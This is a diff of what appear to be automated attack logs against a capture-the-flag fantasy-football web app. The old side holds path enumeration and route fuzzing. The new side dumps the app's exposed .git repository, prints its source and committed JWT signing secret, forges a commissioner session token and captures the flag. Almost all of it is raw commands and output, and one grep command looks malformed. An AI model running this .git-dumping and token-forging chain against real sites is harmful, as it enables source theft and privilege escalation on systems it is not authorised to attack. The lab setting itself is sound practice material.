@@ -1,96 +1,229 @@
-############ /public/site.css ############
-status 200 len 5561
-/* WorldOutter - fantasy football league. Dark, data-dense sports app:
-   navy chrome, electric-blue accent, live green/red numbers, tight tables. */
-:root{
-  --bg:#0f1620; --panel:#18212e; --panel2:#1e2836; --ink:#eef3f8; --muted:#93a2b4; --faint:#6b7a8d;
-  --line:#28323f; --blue:#2f81f7; --blue-dk:#1f6fe0; --green:#2fbf71; --red:#e5484d; --gold:#e0b341;
-  --sans:'Inter','Segoe UI',system-ui,Arial,sans-serif;
-  --mono:ui-monospace,'SFMono-Regular',Menlo,monospace;
+$ /usr/bin/python3 -m pip install --quiet git-dumper || pip install --quiet git-dumper
+
+$ git-dumper https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/ dump
+9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/HEAD [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/staging [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/production [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/development [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/stash [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/main [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/master [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/staging [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/master [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/main [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/production [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/development [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/main [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/master [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/staging [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/production [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/development [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/HEAD [200]
+[-] Finding packs
+[-] Finding objects
+[-] Fetching objects
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/3e/0eb9966c0cc45d26b004a1bb1eebf8731d8bc6 [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/b5/44a7b93d2777c7fb68676cc313d3e5cbbaad76 [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/91/d16407f665a6fe30620652ac2d679802bdad82 [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/0b/7202628ed321f4d2ef4b3002849dc5bfdc744a [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/a1/70e0096347c40b569e0bce5aa7849e439ae5c2 [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/e7/8bd8685d55257e03865325f43ff1f6988c5ac7 [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/00/00000000000000000000000000000000000000 [404]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/cd/2dbe4e533c0addafae7f3c6b1af2dd26abd5ed [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/3c/bdbeaab478e0e60d6ce8907df9b34411ceb4f6 [200]
+[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/4a/aae91cae27ead966437c8869a2e9768ebd2339 [200]
+[-] Running git checkout .
+
+
+########## RECOVERED FILES ##########
+dump/.gitignore 50
+dump/server.js 8684
+dump/package.json 303
+dump/config/secret.js 192
+dump/public/site.css 5561
+$ cd dump && git checkout -- . 2>/dev/null; git checkout HEAD -- . 2>/dev/null; git reset --hard 2>/dev/null; ls -la
+HEAD is now at 3e0eb99 Deploy WorldOutter league app
+total 40
+drwxr-xr-x 5 runner runner 4096 Sep 26 05:45 .
+drwxr-xr-x 7 runner runner 4096 Sep 26 05:45 ..
+drwxr-xr-x 7 runner runner 4096 Sep 26 05:45 .git
+-rw-r--r-- 1 runner runner   50 Sep 26 05:45 .gitignore
+drwxr-xr-x 2 runner runner 4096 Sep 26 05:45 config
+-rw-r--r-- 1 runner runner  303 Sep 26 05:45 package.json
+drwxr-xr-x 2 runner runner 4096 Sep 26 05:45 public
+-rw-r--r-- 1 runner runner 8684 Sep 26 05:45 server.js
+
+
+########## SOURCE DUMPS ##########
+
+===== dump/server.js (8684 bytes) =====
+'use strict';
+// WorldOutter - fantasy football league. The session cookie (wo_session) is an
+// HS256 JWT signed with JWT_SECRET from config/secret.js. That secret is also
+// committed into the .git repo the deploy left served at /.git, so it can be
+// recovered and used to forge a {role:"commissioner"} token, which unlocks the
+// Commissioner console where the league's private key (the flag) is shown.
+const express = require('express');
+const cookieParser = require('cookie-parser');
+const jwt = require('jsonwebtoken');
+const path = require('path');
+
+const { JWT_SECRET } = require('./config/secret');
+const FLAG = process.env.FLAG || 'WEBVERSE{worldoutter_local}';
+const LEAGUE = 'Founders Dynasty League';
+
+const app = express();
+app.disable('x-powered-by');
+app.use(cookieParser());
+
+// The deploy pushed the whole repo, so the .git directory is served. Directory
+// listing is off (express.static does not autoindex); the object store is
+// reachable, which is the exposure.
+app.use('/.git', express.static(path.join(__dirname, '.git'), { dotfiles: 'allow', index: false, redirect: false }));
+app.use('/public', express.static(path.join(__dirname, 'public'), { index: false }));
+
+// Every visitor is a league member. Issue a signed member session if absent.
+app.use((req, res, next) => {
+  let claims = null;
+  if (req.cookies.wo_session) {
+    try { claims = jwt.verify(req.cookies.wo_session, JWT_SECRET, { algorithms: ['HS256'] }); } catch (e) { claims = null; }
+  }
+  if (!claims) {
+    claims = { user: 'you', team: 'Gridiron Gophers', role: 'member' };
+    res.cookie('wo_session', jwt.sign(claims, JWT_SECRET, { algorithm: 'HS256' }), { httpOnly: true, sameSite: 'lax' });
+  }
+  req.claims = claims;
+  next();
+});
+
+const STANDINGS = [
+  ['Riverside Ramblers', 'M. Ellis', 7, 1, 1043.5, 872.1],
+  ['Copperton Cobras', 'D. Nkemdirim', 6, 2, 998.2, 910.7],
+  ['Vale Vanguard', 'S. Okafor', 5, 3, 964.0, 933.4],
+  ['Gridiron Gophers', 'You', 5, 3, 951.8, 940.3],
+  ['Harbor Hphins', 'T. Alvarez', 4, 4, 902.6, 918.9],
+  ['Ninth Street Nine', 'K. Brandt', 3, 5, 878.3, 951.2],
+  ['Dust Bowl Diesel', 'R. Whitlock', 2, 6, 845.1, 989.5],
+  ['Lowland Larks', 'P. Devi', 2, 6, 831.7, 1002.0],
+];
+const MATCHUPS = [
+  ['Riverside Ramblers', 138.4, 'Ninth Street Nine', 121.7],
+  ['Gridiron Gophers', 129.9, 'Harbor Hphins', 116.2],
+  ['Copperton Cobras', 141.0, 'Lowland Larks', 108.8],
+  ['Vale Vanguard', 133.5, 'Dust Bowl Diesel', 125.1],
+];
+const ROSTER = [
+  ['QB', 'Marcus Vance', 'CPT', 22.4, 24.8],
+  ['RB', 'Deon Hartley', 'RIV', 18.1, 15.6],
+  ['RB', 'Isaiah Crook', 'VAL', 14.7, 12.2],
+  ['WR', 'Tobias Reyes', 'CPT', 20.9, 17.4],
+  ['WR', 'Andre Salloum', 'HRB', 12.3, 13.9],
+  ['TE', 'Grant Mueller', 'NIN', 9.8, 8.1],
+  ['FLEX', 'Cole Barrentine', 'DUS', 11.2, 10.5],
+  ['K', 'Petar Kovac', 'VAL', 8.0, 7.5],
+  ['DEF', 'Copperton D/ST', 'CPT', 10.0, 9.2],
+];
+const h = (s) => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+function layout(title, active, body) {
+  const nav = [['/', 'My Team', 'team'], ['/league', 'League', 'league'], ['/players', 'Players', 'players'], ['/scores', 'Scores', 'scores']];
+  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>${h(title)} - WorldOutter</title><link rel="stylesheet" href="/public/site.css"></head><body>
+<header class="wo-top"><div class="wo-top__in">
+  <a class="wo-logo" href="/">WORLD<span>OUTTER</span></a>
+  <nav class="wo-nav">${nav.map(n => `<a class="${active===n[2]?'is-active':''}" href="${n[0]}">${n[1]}</a>`).join('')}</nav>
+  <div class="wo-top__r"><span class="wo-week">Week 9</span><span class="wo-league">${h(LEAGUE)}</span><a class="wo-gear" href="/commissioner" title="Commissioner">&#9881;</a></div>
+</div></header>
+<div class="wo-sub"><div class="wo-sub__in"><span class="wo-sub__team">Gridiron Gophers</span><span class="wo-sub__rec">Season 2026 &middot; PPR &middot; 10-team</span></div></div>
+<main class="wo-main">${body}</main>
+<footer class="wo-foot">WorldOutter Fantasy &middot; ${h(LEAGUE)} &middot; Not affiliated with any professional league</footer>
+</body></html>`;
 }
-*{box-sizing:border-box}
-html,body{margin:0}
-body{font-family:var(--sans);background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column}
-a{color:inherit;text-decoration:none}
-.wo-main{flex:1 0 auto;max-width:1080px;margin:0 auto;paddi
-CSS COMMENT: /* WorldOutter - fantasy football league. Dark, data-dense sports app:
-   navy chrome, electric-blue accent, live green/red numbers, tight tables. */
-CSS COMMENT: /* top nav */
-CSS COMMENT: /* sub bar */
-CSS COMMENT: /* panels */
-CSS COMMENT: /* matchup */
-CSS COMMENT: /* tables */
-CSS COMMENT: /* scores */
-CSS COMMENT: /* commissioner */
 
-############ /public enumeration ############
-     404 /public/                                         ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/index.html                               ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/app.js                                   ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/main.js                                  ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/site.js                                  ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/script.js                                ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/bundle.js                                ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/server.js                                ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/app.py                                   ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/index.js                                 ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/.env                                     ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/config.js                                ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/config.json                              ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/secret.txt                               ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/flag.txt                                 ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/README.md                                ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/package.json                             ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/site.css.map                             ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
-     404 /public/robots.txt                               ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /publ
+app.get('/', (req, res) => {
+  const mine = MATCHUPS[1];
+  const body = `
+  <div class="wo-grid">
+    <section class="wo-panel">
+      <div class="wo-panel__h">Your matchup - Week 9</div>
+      <div class="wo-match">
+        <div class="wo-match__side"><span class="wo-match__team">${h(mine[0])}</span><span class="wo-match__pts">${mine[1]}</span></div>
+        <span class="wo-match__vs">vs</span>
+        <div class="wo-match__side wo-match__side--opp"><span class="wo-match__team">${h(mine[2])}</span><span class="wo-match__pts">${mine[3]}</span></div>
+      </div>
+      <p class="wo-win">Win probability <strong>68%</strong> &middot; Projected ${mine[1]} - 118.0</p>
+    </section>
+    <section class="wo-panel">
+      <div class="wo-panel__h">Starting lineup</div>
+      <table class="wo-tbl"><thead><tr><th>Slot</th><th>Player</th><th>Team</th><th>Proj</th><th>Pts</th></tr></thead><tbody>
+      ${ROSTER.map(r => `<tr><td class="wo-slot">${r[0]}</td><td>${h(r[1])}</td><td class="wo-mono">${h(r[2])}</td><td class="wo-mono">${r[3]}</td><td class="wo-mono wo-live">${r[4]}</td></tr>`).join('')}
+      </tbody></table>
+    </section>
+  </div>`;
+  res.send(layout('My Team', 'team', body));
+});
 
-############ PATH TRAVERSAL / LFI via static ############
+app.get('/league', (req, res) => {
+  const body = `<section class="wo-panel">
+    <div class="wo-panel__h">League standings</div>
+    <table class="wo-tbl wo-tbl--stand"><thead><tr><th>#</th><th>Team</th><th>Manager</th><th>W</th><th>L</th><th>PF</th><th>PA</th></tr></thead><tbody>
+    ${STANDINGS.map((s, i) => `<tr class="${s[1]==='You'?'is-me':''}"><td class="wo-mono">${i+1}</td><td>${h(s[0])}</td><td class="wo-dim">${h(s[1])}</td><td class="wo-mono">${s[2]}</td><td class="wo-mono">${s[3]}</td><td class="wo-mono">${s[4]}</td><td class="wo-mono">${s[5]}</td></tr>`).join(
+  >> FLAG-LIKE: WEBVERSE{worldoutter_local}
 
-############ ROUTE FUZZ ############
-     404 /dashboard                                       ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /dash
-     404 /manage                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /mana
-     404 /roster                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /rost
-     404 /trade                                           ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /trad
-     404 /transactions                                    ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /tran
-     404 /waivers                                         ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /waiv
-     404 /draft                                           ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /draf
-     404 /matchup                                         ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /matc
-     404 /team                                            ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /team
-     404 /teams                                           ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /team
-     404 /health                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /heal
-     404 /status                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /stat
-     404 /version                                         ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /vers
-     404 /flag                                            ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /flag
-     404 /api/health                                      ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/status                                      ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/flag                                        ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/team                                        ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/league                                      ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/players                                     ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/scores                                      ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/user                                        ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/session                                     ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/settings                                    ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /settings                                        ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /sett
-     404 /console                                         ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /cons
-     404 /admin                                           ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /admi
-     404 /manage                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /mana
-     404 /commissioner/flag                               ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /comm
-     404 /commissioner/data                               ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /comm
-     404 /commissioner/console                            ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /comm
-     404 /lineup                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /line
-     404 /api/commissioner/settings                       ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /api/v1                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /api/
-     404 /graphql                                         ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /grap
-     404 /whoami                                          ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /whoa
-     404 /debug                                           ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /debu
-     404 /env                                             ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /env<
-***  200 /.git/HEAD                                       ct=application/octet-stre ref: refs/heads/main 
-***  200 /.git/config                                     ct=application/octet-stre [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [user] email = dev@worldoutter.e
-     404 /backup.zip                                      ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /back
-     404 /source.zip                                      ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /sour
-     404 /app.zip                                         ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /app.
-     404 /site.zip                                        ct=text/html; charset=utf <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /site
+===== dump/package.json (303 bytes) =====
+{
+  "name": "worldoutter",
+  "version": "1.0.0",
+  "private": true,
+  "description": "WorldOutter fantasy football league",
+  "main": "server.js",
+  "scripts": { "start": "node server.js" },
+  "dependencies": {
+    "express": "^4.19.2",
+    "jsonwebtoken": "^9.0.2",
+    "cookie-parser": "^1.4.6"
+  }
+}
 
-DONE
+
+===== dump/config/secret.js (192 bytes) =====
+// Session signing secret for WorldOutter league auth.
+// TODO(dev): pull this from a real secret manager before we scale.
+module.exports = { JWT_SECRET: 'd56948fbb905ee6fb9a45840fdf131c8' };
+
+  >> POSSIBLE SECRET: JWT_SECRET: 'd56948fbb905ee6fb9a45840fdf131c8'
+
+########## GREP ##########
+$ grep -rniE 'secret|flag\{|zdk\{|commissioner|jwt|sign' dump --include='*.js' --include='*.json' --include='*.env' --include='*.ts' --include='*.txt' 2>/dev/null | grep -viv '' | head -80
+
+
+DETECTED SECRET: 'd56948fbb905ee6fb9a45840fdf131c8'
+member payload: {'user': 'you', 'team': 'Gridiron Gophers', 'role': 'member', 'iat': 1790401552}
+
+=== secret='d56948fbb905ee6fb9a45840fdf131c8' status=200 denied=False ===
+COOKIE: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91IiwidGVhbSI6IkdyaWRpcm9uIEdvcGhlcnMiLCJyb2xlIjoiY29tbWlzc2lvbmVyIiwiaWF0IjoxNzkwNDAxNTUyfQ.57bIDmfetgU64JmRfvF4RA9ezqUW1VGsZ3XqjZtb_yU
+*** ACCESS GRANTED ***
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Commissioner - WorldOutter</title><link rel="stylesheet" href="/public/site.css"></head><body>
+<header class="wo-top"><div class="wo-top__in">
+  <a class="wo-logo" href="/">WORLD<span>OUTTER</span></a>
+  <nav class="wo-nav"><a class="" href="/">My Team</a><a class="" href="/league">League</a><a class="" href="/players">Players</a><a class="" href="/scores">Scores</a></nav>
+  <div class="wo-top__r"><span class="wo-week">Week 9</span><span class="wo-league">Founders Dynasty League</span><a class="wo-gear" href="/commissioner" title="Commissioner">&#9881;</a></div>
+</div></header>
+<div class="wo-sub"><div class="wo-sub__in"><span class="wo-sub__team">Gridiron Gophers</span><span class="wo-sub__rec">Season 2026 &middot; PPR &middot; 10-team</span></div></div>
+<main class="wo-main"><section class="wo-panel">
+    <div class="wo-panel__h">Commissioner console</div>
+    <p class="wo-comm__lead">Welcome, Commissioner. These controls affect every team in Founders Dynasty League.</p>
+    <div class="wo-comm__grid">
+      <div class="wo-comm__card"><h4>Edit scoring settings</h4><p>PPR, bonuses, and stat corrections.</p></div>
+      <div class="wo-comm__card"><h4>Process trades</h4><p>Approve or veto pending trades.</p></div>
+      <div class="wo-comm__card"><h4>Manage members</h4><p>Invite, remove, and reassign teams.</p></div>
+    </div>
+    <div class="wo-comm__key"><span>League API key (keep private)</span><code>WEBVERSE{f706ffc443beace02eea1afe2ca0a142}</code></div>
+  </section></main>
+<footer class="wo-foot">WorldOutter Fantasy &middot; Founders Dynasty League &middot; Not affiliated with any professional league</footer>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"b555bf0b6ced40d5b5d7fd21b269244b","r":1,"spa":2}' crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a40ff7057e2df7a9',t:'MTc5MDQwMTU1Mg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>
+FLAGS: ['WEBVERSE{f706ffc443beace02eea1afe2ca0a142}']
+
+DONE, secret= 'd56948fbb905ee6fb9a45840fdf131c8'
